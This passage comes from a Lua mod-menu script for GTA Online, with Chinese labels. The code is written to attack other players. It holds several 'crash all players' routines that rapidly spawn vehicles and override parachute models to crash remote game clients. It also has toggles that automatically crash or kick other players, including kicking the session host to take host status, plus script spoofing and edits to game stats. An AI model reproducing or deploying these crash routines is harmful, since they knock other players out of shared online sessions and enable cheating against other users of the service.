    PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 800, false, true, true)
    util.yield(200)
    VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 148511758)
    VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
    util.yield(300000)
    entities.delete_by_handle(Ruiner2)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
end)

menu.action(global_options, "载具伞崩全局", {}, "崩溃所有玩家--YIYU", function ()

chesan()

end)

menu.action(global_options, "无效降落伞Plus", {}, "By YIYU", function ()
    notification("开始崩溃")
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    --^^
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    ---^^
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 5 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 200, false, true, true)
        util.yield(100)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 	3235319999)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(100)
        entities.delete_by_handle(Ruiner2)
    end

    for i = 1, 10 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 2000, false, true, true)
        util.yield(120)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 	260873931)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(120)
        entities.delete_by_handle(Ruiner2)
    end

    for i = 1, 10 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(100)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 	546252211)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(100)
        entities.delete_by_handle(Ruiner2)
    end


    for i = 1, 8 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 800, false, true, true)
        util.yield(200)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 	148511758)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
    end

    for i = 1, 10 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 500, false, true, true)
        util.yield(100)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 	260873931)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(100)
        entities.delete_by_handle(Ruiner2)
    end
    util.yield(200)

    for i = 1, 5 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 300, false, true, true)
        util.yield(500)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 1381105889)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(500)
        entities.delete_by_handle(Ruiner2)
    end

    for i = 1, 25 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 200, false, true, true)
        util.yield(150)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 	1500925016)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(150)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
    --^^
    for n = 0 , 2 do
        local object_hash = util.joaat("prop_logpile_06b")
        STREAMING.REQUEST_MODEL(object_hash)
          while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,100, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
        util.yield(800)
        for i = 0 , 1 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(800)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)

        local object_hash2 = util.joaat("prop_beach_parasol_03")
        STREAMING.REQUEST_MODEL(object_hash2)
          while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,100, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
        util.yield(800)
        for i = 0 , 1 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(800)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)


    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    util.yield()
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    util.yield(300)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    util.yield(1000)

    for i = 1, 10 do
        util.spoof_script("freemode", SYSTEM.WAIT)
    end
    ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
    for i = 1, 2 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 150, false, true, true)
        util.yield(200)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 	1500925016)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
    for i = 1, 2 do
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    util.yield()
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    util.yield(200)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    util.yield(4500)
    for i = 1, 2 do
        util.spoof_script("freemode", SYSTEM.WAIT)
    end
    ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)

end
notification("崩溃完成")
end)



menu.action(global_options, "人物伞崩全局V1", {}, "崩溃所有玩家", function()

san1()

end)



menu.action(global_options,"人物伞崩全局V2",{},"崩溃所有玩家",function()

san2()

end)



menu.action(global_options,"人物伞崩全局V3",{},"崩溃所有玩家",function()

san3()

end)

    

menu.action(global_options, "人物伞崩全局V4", {}, "慎用,可能会自崩", function()

san4()

end)


menu.action(global_options,"人物伞崩全局V5",{},"崩溃所有玩家",function()

san5()

end)

menu.action(global_options,"声音崩溃",{},"崩溃所有玩家",function()

shengyin()

end)



menu.action(global_options,"CARGO崩溃",{},"崩溃所有玩家",function()

CARGO()

end)



menu.action(global_options, "数学崩溃", {"mathcrash"}, "崩溃所有玩家", function()

    math_crash()

end)

local pool_limiter = menu.list(protection_options, "实体池限制", {}, "")

    ped_limit = 175

    menu.slider(pool_limiter, "Ped池限制", {"pedslimit"}, "默认为175", 0, 256, 175, 1, function(amount)

        ped_limit = amount

    end)

    

    veh_limit = 150

    menu.slider(pool_limiter, "载具池限制", {"vehlimit"}, "默认为150", 0, 300, 150, 1, function(amount)

        veh_limit = amount

    end)

    

    obj_limit = 500

    menu.slider(pool_limiter, "物体池限制", {"objlimit"}, "默认为500", 0, 2300, 500, 1, function(amount)

        obj_limit = amount

    end)

    

    projectile_limit = 25

    menu.slider(pool_limiter, "投掷物池限制", {"projlimit"}, "默认为25", 0, 50, 25, 1, function(amount)

        projectile_limit = amount

    end)

    

    menu.toggle_loop(pool_limiter, "启用实体池限制", {}, "", function()
        entity_limit()
    end)

    local Other_options_SnackArmour = menu.list(protection_options, "零食护甲编辑", {}, "")


menu.action(Other_options_SnackArmour, "补满全部零食", {}, "", function()
    STAT_SET_INT("NO_BOUGHT_YUM_SNACKS", 30)
    STAT_SET_INT("NO_BOUGHT_HEALTH_SNACKS", 15)
    STAT_SET_INT("NO_BOUGHT_EPIC_SNACKS", 5)
    STAT_SET_INT("NUMBER_OF_ORANGE_BOUGHT", 10)
    STAT_SET_INT("NUMBER_OF_BOURGE_BOUGHT", 10)
    STAT_SET_INT("NUMBER_OF_CHAMP_BOUGHT", 5)
    STAT_SET_INT("CIGARETTES_BOUGHT", 20)
    STAT_SET_INT("NUMBER_OF_SPRUNK_BOUGHT", 10)
    notification("完成！")
end)
menu.action(Other_options_SnackArmour, "补满全部护甲", {}, "", function()
    STAT_SET_INT("MP_CHAR_ARMOUR_1_COUNT", 10)
    STAT_SET_INT("MP_CHAR_ARMOUR_2_COUNT", 10)
    STAT_SET_INT("MP_CHAR_ARMOUR_3_COUNT", 10)
    STAT_SET_INT("MP_CHAR_ARMOUR_4_COUNT", 10)
    STAT_SET_INT("MP_CHAR_ARMOUR_5_COUNT", 10)
    notification("完成！")
end)
menu.action(Other_options_SnackArmour, "补满呼吸器", {}, "", function()
    STAT_SET_INT("BREATHING_APPAR_BOUGHT", 20)
    notification("完成！")
end)

menu.divider(Other_options_SnackArmour, "零食")
menu.click_slider(Other_options_SnackArmour, "PQ豆", { "snack_yum" }, "+15 Health", 0, 999, 30, 1, function(value)
    STAT_SET_INT("NO_BOUGHT_YUM_SNACKS", value)
    notification("完成！")
end)
menu.click_slider(Other_options_SnackArmour, "宝力旺", { "snack_health" }, "+45 Health", 0, 999, 15, 1,
    function(value)
        STAT_SET_INT("NO_BOUGHT_HEALTH_SNACKS", value)
        notification("完成！")
    end)
menu.click_slider(Other_options_SnackArmour, "麦提来", { "snack_epic" }, "+30 Health", 0, 999, 5, 1,
    function(value)
        STAT_SET_INT("NO_BOUGHT_EPIC_SNACKS", value)
        notification("完成！")
    end)
menu.click_slider(Other_options_SnackArmour, "易可乐", { "snack_orange" }, "+36 Health", 0, 999, 10, 1,
    function(value)
        STAT_SET_INT("NUMBER_OF_ORANGE_BOUGHT", value)
        notification("完成！")
    end)
menu.click_slider(Other_options_SnackArmour, "尿汤啤", { "snack_bourge" }, "", 0, 999, 10, 1, function(value)
    STAT_SET_INT("NUMBER_OF_BOURGE_BOUGHT", value)
    notification("完成！")
end)
menu.click_slider(Other_options_SnackArmour, "蓝醉香槟", { "snack_champ" }, "", 0, 999, 5, 1, function(value)
    STAT_SET_INT("NUMBER_OF_CHAMP_BOUGHT", value)
    notification("完成！")
end)
menu.click_slider(Other_options_SnackArmour, "香烟", { "snack_cigarettes" }, "-5 Health", 0, 999, 20, 1,
    function(value)
        STAT_SET_INT("CIGARETTES_BOUGHT", value)
        notification("完成！")
    end)
menu.click_slider(Other_options_SnackArmour, "霜碧", { "snack_sprunk" }, "+36 Health", 0, 999, 10, 1,
    function(value)
        STAT_SET_INT("NUMBER_OF_SPRUNK_BOUGHT", value)
        notification("完成！")
    end)

menu.toggle_loop(protection_options, "自动获取脚本主机", {"scriptshost"}, "更快获取脚本主机", function()

    if players.get_script_host() ~= players.user() and get_transition_state(players.user()) ~= 0 then

        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(players.user())..">Friendly>Give Script Host"))

    end

end)



menu.toggle_loop(protection_options, "自动获取主机", {"alwayshost"}, "", function()

	if not (players.get_host() == PLAYER.PLAYER_ID()) and not util.is_session_transition_active() then

		if not (PLAYER.GET_PLAYER_NAME(players.get_host()) == "**Invalid**") then

			menu.trigger_commands("kick"..PLAYER.GET_PLAYER_NAME(players.get_host()))

			util.yield(200)

		end

	end

end)



local ridicule = "\n你正在攻击一位尊贵的小助手VIP用户.请立刻停止你的行为!\n--------¦Heezy LuaScript"

menu.text_input(protection_options, "自定义嘲讽文字", {"Customize ridicule"}, "", function(value)

    ridicule = value

end, ridicule)

menu.toggle_loop(protection_options, "攻击嘲讽", {"ridicule"}, "", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        if players.is_marked_as_attacker(pid,1 << 0x03) or players.is_marked_as_attacker(pid,1 << 0x04) or players.is_marked_as_attacker(pid,1 << 0x05) or players.is_marked_as_attacker(pid,1 << 0x0C) or players.is_marked_as_attacker(pid,1 << 0x0D) or players.is_marked_as_attacker(pid,1 << 0x0E) then
            chat.send_message(PLAYER.GET_PLAYER_NAME(pid)..ridicule,false,true,true)
                break
            end
        end

end)

menu.toggle_loop(protection_options, "崩溃反弹", {"crashrebound"}, "哪个好用用哪个", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        if players.is_marked_as_attacker(pid,1 << 0x03) or players.is_marked_as_attacker(pid,1 << 0x04) or players.is_marked_as_attacker(pid,1 << 0x05) or players.is_marked_as_attacker(pid,1 << 0x0C) or players.is_marked_as_attacker(pid,1 << 0x0D) or players.is_marked_as_attacker(pid,1 << 0x0E) then
            menu.trigger_commands("mathcrash") 
                break
            end
        end

end)

menu.toggle_loop(protection_options, "崩溃反弹2", {"crashrebound2"}, "哪个好用用哪个", function()


    _U_hack_list={}

    while true do

        util.yield(0)

        for pid=0,31 do

            if pid~= PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID) then

                if players.is_marked_as_attacker(pid,1 << 0x03) or players.is_marked_as_attacker(pid,1 << 0x04) or players.is_marked_as_attacker(pid,1 << 0x05) or players.is_marked_as_attacker(pid,1 << 0x0C) or players.is_marked_as_attacker(pid,1 << 0x0D) or players.is_marked_as_attacker(pid,1 << 0x0E) then

                    if not _U_hack_list[pid+1] then

                        menu.trigger_commands("mathcrash") 

                        _U_hack_list[pid+1]=true

                    end

                else

                    _U_hack_list[pid+1]=false

                end

            end

        end

    end

end)



menu.action(protection_options, "强制停止所有声音事件", {""}, "", function()

    for i=-1,100 do

        AUDIO.STOP_SOUND(i)

        AUDIO.RELEASE_SOUND_ID(i)

    end

end)


menu.action(protection_options, "超级清除", {"superclear"}, "", function()
    super_clear()
end)



menu.toggle_loop(protection_options, "连续清除世界", {""}, "", function()

    MISC.CLEAR_AREA(0,0,0 , 1000000, true, true, true, true)

end)



menu.toggle(protection_options, "昏哥模式", {"panic"}, "没错就是自闭", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then

        notification("开启昏哥模式")

        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")

    else

        notification("关闭昏哥模式")

        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end

end)

menu.toggle(protection_options, "提高FPS V1", {"fpsboost"}, "", function(on_toggle)
	if on_toggle then
		notification("正在设置FPS...")
		menu.trigger_commands("weather" .. " extrasunny")
		menu.trigger_commands("clouds" .. " clear01")
		menu.trigger_commands("time" .. " 6")
		menu.trigger_commands("superc")
        menu.trigger_commands("noidlecam ")
	else
		notification("正在重置FPS...")
		menu.trigger_commands("weather" .. " normal")
		menu.trigger_commands("clouds" .. " normal")
        menu.trigger_commands("noidlecam ")
		end
	end)

	menu.toggle(protection_options, "提高FPS V2", {"fpsnsboost"}, ".", function(on_toggle)
	if on_toggle then
		notification("正在设置FPS...")
		menu.trigger_commands("weather" .. " extrasunny")
		menu.trigger_commands("clouds" .. " clear01")
		menu.trigger_commands("time" .. " 6")
		menu.trigger_commands("superc")
        menu.trigger_commands("potatomode ")
        menu.trigger_commands("nosky ")
        menu.trigger_commands("noidlecam ")
	else
		notification("正在重置FPS...")
		menu.trigger_commands("weather" .. " normal")
		menu.trigger_commands("clouds" .. " normal")
        menu.trigger_commands("potatomode ")
        menu.trigger_commands("nosky ")
        menu.trigger_commands("noidlecam ")
		end
	end)


constructs = menu.action(model_options, "加载Constructor", {""}, "", function()
    notification("正在加载constructs,请稍等")
util.yield(1500)
dofile(filesystem.scripts_dir().."\\BeezyLib\\Constructor.lua")
    menu.delete(constructs)
end)




island_block = 0

menu.action(world_options, "天空岛", {""}, "", function(on_click)

    local c = {}

    c.x = 0

    c.y = 0

    c.z = 500

    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), c.x, c.y, c.z+5)

    if island_block == 0 or not ENTITY.DOES_ENTITY_EXIST(island_block) then

        request_model_load(1054678467)

        island_block = entities.create_object(1054678467, c)

    end

end)



local qiuqiu = {"生成", "删除"}

menu.list_action(world_options, "球体", {}, "在花园银行顶部生成一个球体", qiuqiu, function(index, value, click_type)

    pluto_switch index do

        case 1:

        aball()

        break

        case 2:

        shanqiu()

    end

end)
local weather_hash <const> = {
    {"天气: 阳光明媚", -1750463879},
    {"天气: 晴朗", 916995460},
    {"天气: 多云", 821931868},
    {"天气: 环境污染", 282916021},
    {" 雾天", -1368164796},
    {" 阴天", -1148613331},
    {" 雨天", 1420204096},
    {" 雷雨天", -1233681761},
    {" 雨晴天", 1840358669},
    {" 温室天气", -1530260698},
    {" 雪天", -273223690},
    {" 暴风雪", 669657108},
    {" 雪雾天", 603685163},
    {" 圣诞节", -1429616491},
    {" 万圣节", -921030142},

    {" 雷雨天", 3061285535},
    {"天气: 阳光明媚", 2544503417},
    --{"环境污染", -1750463879},
    {" 雾天", 2926802500},
    {" 阴天", 3146353965},
    {" 温室天气", 2764706598},
    {" 圣诞节", -2865350805},
    {" 万圣节", 3373937154},
}
tianqiyubao = menu.list(world_options, "天气预报", {""}, "")
 menu.slider_text(tianqiyubao, "发送位置", {""}, "单击以修改", {"通知", "公屏"}, function(value)
    send_weather_location = value
end)
local weather_forecast = true
menu.toggle_loop(tianqiyubao, "天气预报", {""}, "", function()
    if weather_forecast then
        nextw_weather = MISC.GET_NEXT_WEATHER_TYPE_HASH_NAME()
        for _, weather in pairs(weather_hash) do
            if nextw_weather == weather[2] then
                if send_weather_location == 2 then
                    chat.send_message("----------洛圣都天气预报----------", false, true, true)
                    chat.send_message("即将迎来" .. weather[1], false, true, true)
                else
                    notification("-------洛圣都天气预报-------\n即将迎来" .. weather[1])
                end
                get_next_weather = true
                weather_forecast = false
            end
        end
    end
    if get_next_weather then
        if nextw_weather ~= MISC.GET_NEXT_WEATHER_TYPE_HASH_NAME() then
            weather_forecast = true
            get_next_weather = false
        end
    end
end,function ()
    weather_forecast = true
end)

meteors = false

menu.toggle(world_options, "一起看流星", {""}, "", function(on)

    if on then

        meteors = true

        start_meteor_shower()

    else

        meteors = false

    end

end, false)





menu.toggle_loop(world_options, "闪电生成", {""}, "", function()

    MISC.FORCE_LIGHTNING_FLASH()

end)



menu.toggle_loop(world_options, "外星人入侵", {}, "", function(toggle)

    ufffo()

end)



menu.toggle_loop(world_options, "定点轰炸", {"pointbombing"}, "定点轰炸", function ()

    local waypointPos = get_waypoint_v3()

    if waypointPos then

        local hash = util.joaat('w_arena_airmissile_01a')

        loadModel(hash)



        waypointPos.z += 30

        local bomb = entities.create_object(hash, waypointPos)

        waypointPos.z -= 30

        ENTITY.SET_ENTITY_ROTATION(bomb, -90, 0, 0,  2, true)

        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, 0, 0, 0, 0.0, 0.0, 0.0, 0, true, false, true, false, true)

        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)



        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do

            util.yield_once()

        end

        entities.delete_by_handle(bomb)

        executeNuke(waypointPos)

    end

end)


menu.toggle_loop(world_options, "PED摇头丸", {"pedheadbang"}, "", function(on)
    yaoptou()
end)

menu.toggle(world_options, "安全的战局", {}, "全战局幽灵", function(on)

	if on then

		for pid = 0,30 do

			if players.exists(pid) then

				NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid,true)

			end

		end

	else

		for pid = 0,30 do

			if players.exists(pid) then

				NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid,false)

			end

		end

	end 

end)






menu.toggle_loop(world_options, "跳跳车", {}, '', function(toggle)

	local entities = GET_NEARBY_VEHICLES(PLAYER.PLAYER_ID(), 150)

	for _, vehicle in ipairs(entities) do

		REQUEST_CONTROL(vehicle)

		ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0, 0, 6.5, 0, 0, 0, 0, false, false, true)

	end

	util.yield(1500)

end)

pedToggleLoops = {
    {name = '摔倒NPC', command = 'ragdollPeds', description = '让附近的所有NPC都摔倒.', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) then return end
        PED.SET_PED_TO_RAGDOLL(ped, 2000, 2000, 0, true, true, true)
    end},
    {name = '死亡接触', command = 'deathTouch', description = '杀死所有碰到您的NPC', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) or PED.IS_PED_IN_ANY_VEHICLE(ped, true) or not ENTITY.IS_ENTITY_TOUCHING_ENTITY(ped, players.user_ped()) then return end
        ENTITY.SET_ENTITY_HEALTH(ped, 0, 0)
    end},
    {name = '寒冷NPC', command = 'coldPeds', description = '移除附近NPC的热特征', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) then return end
        PED.SET_PED_HEATSCALE_OVERRIDE(ped, 0)
    end},
    {name = 'NPC喇叭加速', command = 'npcHornBoost', description = '当NPC按喇叭的时候加速它们的载具.', action = function(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if PED.IS_PED_A_PLAYER(ped) or not PED.IS_PED_IN_ANY_VEHICLE(ped, true) or not AUDIO.IS_HORN_ACTIVE(vehicle) then return end
        AUDIO.SET_AGGRESSIVE_HORNS(true) --Makes pedestrians sound their horn longer, faster and more agressive when they use their horn.
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, ENTITY.GET_ENTITY_SPEED(vehicle) + 1.2)
    end, onStop = function()
        AUDIO.SET_AGGRESSIVE_HORNS(false)
    end},
    {name = 'NPC警笛加速', command = 'npcSirenBoost', description = '当NPC响起警车的警笛的时候加速它们的载具.', action = function(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if PED.IS_PED_A_PLAYER(ped) or not PED.IS_PED_IN_ANY_VEHICLE(ped, true) or not VEHICLE.IS_VEHICLE_SIREN_ON(vehicle) then return end
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, ENTITY.GET_ENTITY_SPEED(vehicle) + 1.2)
    end},
    {name = '自动杀死敌人', command = 'autokill', description = '立即击杀NPC敌人.', action = function(ped)
        local rel = PED.GET_RELATIONSHIP_BETWEEN_PEDS(players.user_ped(), ped)
        if PED.IS_PED_A_PLAYER(ped) or ENTITY.IS_ENTITY_DEAD(ped) or not( (rel == 4 or rel == 5) or PED.IS_PED_IN_COMBAT(ped, players.user_ped()) ) then return end
        ENTITY.SET_ENTITY_HEALTH(ped, 0, 0)
    end},
}
for i = 1, #pedToggleLoops do
    menu.toggle_loop(world_options, pedToggleLoops[i].name, {pedToggleLoops[i].command}, pedToggleLoops[i].description, function()
        local pedHandles = entities.get_all_peds_as_handles()
        for j = 1, #pedHandles do
            pedToggleLoops[i].action(pedHandles[j])
        end
        util.yield(10)
    end, function()
        if pedToggleLoops[i].onStop then pedToggleLoops[i].onStop() end
    end)
end

menu.toggle_loop(world_options, '杀死车主', {'killJackedPeds'}, '抢车的时候自动杀死驾驶载具的NPC', function(toggle)
    if not PED.IS_PED_JACKING(players.user_ped()) then return end
    local jackedPed = PED.GET_JACK_TARGET(players.user_ped())
    util.yield(100)
    ENTITY.SET_ENTITY_HEALTH(jackedPed, 0, 0)
end)

menu.toggle(world_options, '暴动模式', {'riot'}, '使附近的NPC充满敌意.', function(toggle)
    MISC.SET_RIOT_MODE_ENABLED(toggle)
end)

menu.toggle_loop(world_options, "禁止为玩家调度警察", {}, "不会一直刷出新的警察，最好在被通缉前开启"
    , function()
        PLAYER.SET_DISPATCH_COPS_FOR_PLAYER(PLAYER.PLAYER_ID(), false)
    end, function()
    PLAYER.SET_DISPATCH_COPS_FOR_PLAYER(PLAYER.PLAYER_ID(), true)
end)
menu.toggle_loop(world_options, "禁用NPC伤害", {}, "", function()
    PED.SET_AI_WEAPON_DAMAGE_MODIFIER(0.0)
    PED.SET_AI_MELEE_WEAPON_DAMAGE_MODIFIER(0.0)
end, function()
    PED.RESET_AI_WEAPON_DAMAGE_MODIFIER()
    PED.RESET_AI_MELEE_WEAPON_DAMAGE_MODIFIER()
end)


renwujioaben = menu.action(task_options, "加载任务选项", {""}, "", function()

    notification("正在加载任务脚本,请稍等")

util.yield(3000)
menu.delete(renwujioaben)
renwujioa = dofile(filesystem.scripts_dir() .."BeezyLib/HCC.lua")
end)

MB = menu.action(task_options, "加载自动产业[风险]", {""}, "", function()

    notification("正在加载MB脚本,请稍等")
    menu.delete(MB)
util.yield(3000)

dofile(filesystem.scripts_dir().."\\BeezyLib\\MusinessBanager.lua")

end)


local Languages = {
	{ Name = "Afrikaans", Key = "af" },
